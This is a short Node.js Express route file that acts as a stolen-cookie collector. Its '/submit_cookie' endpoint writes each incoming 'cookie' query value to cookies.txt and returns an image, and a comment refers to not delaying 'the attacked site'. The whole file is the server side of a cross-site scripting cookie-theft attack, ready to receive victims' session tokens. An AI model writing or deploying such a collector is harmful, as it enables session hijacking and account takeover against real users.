const express = require('express');
const router = express.Router();
const fs = require("fs");

router.get('/submit_cookie', (req, res, next) => {
  console.log(req.query, req.params, req.body);
  // NOTE: it's intentinally not inside the cb cos we don't want to make the attacked site wait.
  fs.appendFile(__dirname + '/cookies.txt', req.query.cookie + '\n', (err) => {
    if (err)
      console.error('saving cookie error', err);
  });
  return res.sendFile(__dirname + '/image.jpeg');
});

module.exports = router;